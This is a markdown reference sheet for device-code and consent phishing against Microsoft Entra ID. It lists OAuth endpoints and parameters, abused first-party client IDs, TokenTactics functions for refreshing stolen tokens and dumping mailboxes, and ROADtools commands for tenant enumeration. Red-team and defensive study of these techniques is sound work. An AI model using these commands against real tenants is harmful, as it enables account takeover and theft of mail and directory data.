# API & Tool Reference — Device-Code / Consent Phishing

## Entra ID OAuth 2.0 endpoints

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/devicecode` | POST | Request `user_code` + `device_code`. `tenant` = `organizations`, `common`, or a tenant ID. |
| `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token` | POST | Poll for tokens (`grant_type=urn:ietf:params:oauth:grant-type:device_code`) or redeem `authorization_code` / `refresh_token`. |
| `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/authorize` | GET | Consent / authorization-code request (illicit consent variant). |
| `https://microsoft.com/devicelogin` | GET | Genuine Microsoft page where the victim enters the `user_code`. |

### Device-code request parameters
| Parameter | Example | Notes |
|-----------|---------|-------|
| `client_id` | `d3590ed6-52b3-4102-aeff-aad2292ab01c` | Microsoft Office (first-party, broad pre-auth). |
| `scope` | `https://graph.microsoft.com/.default offline_access` | `offline_access` yields a long-lived refresh token. |

### Token-poll parameters
| Parameter | Value |
|-----------|-------|
| `grant_type` | `urn:ietf:params:oauth:grant-type:device_code` |
| `client_id` | same as request |
| `device_code` | from device-code response |

Poll responses: `authorization_pending`, `slow_down`, `expired_token`, `authorization_declined`, or success (`access_token`, `refresh_token`, `id_token`).

## Common first-party client IDs
| Client | Client ID |
|--------|-----------|
| Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
| Microsoft Azure CLI | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` |
| Microsoft Azure PowerShell | `1950a258-227b-4e31-a9cf-717495945fc2` |
| Microsoft Teams | `1fec8e78-bce4-4aaf-ab1b-5451cc387264` |

## TokenTactics (PowerShell) functions
| Function | Key parameters | Purpose |
|----------|---------------|---------|
| `Get-AzureToken` | `-Client` (MSGraph, DODMSGraph) | Generate device code, poll, return tokens. |
| `Invoke-RefreshToMSGraphToken` | `-domain -refreshToken [-ClientId]` | Refresh to Microsoft Graph. |
| `Invoke-RefreshToOutlookToken` | `-domain -refreshToken` | Refresh to Outlook/EXO. |
| `Invoke-RefreshToMSTeamsToken` | `-domain -refreshToken` | Refresh to Teams. |
| `Invoke-RefreshToAzureCoreManagementToken` | `-domain -refreshToken` | Refresh to Azure ARM. |
| `Invoke-RefreshToSubstrateToken` | `-domain -refreshToken` | Refresh to Substrate. |
| `Invoke-DumpOWAMailboxViaMSGraphApi` | `-AccessToken -mailFolder` | Read mailbox via Graph. |
| `Invoke-ParseJWTtoken` | `-Token` | Decode a JWT. |

## ROADtools
| Command | Purpose |
|---------|---------|
| `roadtx refreshtokento -r <rt> -c <client_id> -s <scope>` | Exchange refresh token for new resource. |
| `roadrecon auth --refresh-token <rt> -c <client_id>` | Authenticate roadrecon. |
| `roadrecon gather` | Dump directory to local DB. |
| `roadrecon gui` | Browse enumerated tenant data. |

Source: https://github.com/rvrsh3ll/TokenTactics , https://github.com/dirkjanm/ROADtools , RFC 8628.
